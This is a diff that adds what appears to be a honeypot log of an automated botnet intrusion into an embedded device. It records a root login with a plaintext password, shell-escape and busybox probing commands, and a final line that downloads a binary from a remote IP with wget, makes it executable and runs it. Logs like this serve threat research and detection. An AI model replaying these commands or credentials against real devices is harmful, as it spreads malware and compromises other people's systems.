@@ -1,0 +1,13 @@
+from: 109.105.251.136:43432 user:root password:founder88
+enable
+system
+shell
+sh
+cat /proc/mounts; /bin/busybox CRDCT
+cd /tmp; cat .s || cp /bin/echo .s; /bin/busybox CRDCT
+tftp; wget; /bin/busybox CRDCT
+dd bs=52 count=1 if=.s || cat .s || while read i; do echo $i; done < .s
+/bin/busybox CRDCT
+rm .s; wget http://115.75.251.40:18960/.i; chmod 777 .i; ./.i; exit
+q
+[eof]
